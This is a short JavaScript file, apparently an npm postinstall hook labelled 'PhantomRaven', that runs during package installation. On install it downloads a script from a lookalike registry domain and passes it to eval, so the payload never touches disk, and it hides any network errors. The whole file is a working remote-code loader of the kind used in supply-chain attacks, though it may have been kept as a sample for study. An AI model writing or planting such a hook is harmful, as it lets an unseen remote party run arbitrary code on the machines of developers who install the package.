// PhantomRaven postinstall: downloads and evals setup script
// Runs during npm install — payload is fetched from remote server

const https = require('https');

const url = 'https://registry.npm-config.dev/setup/init.js';

https.get(url, (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    // eval the remote payload — never stored on disk
    eval(data);
  });
}).on('error', () => {});
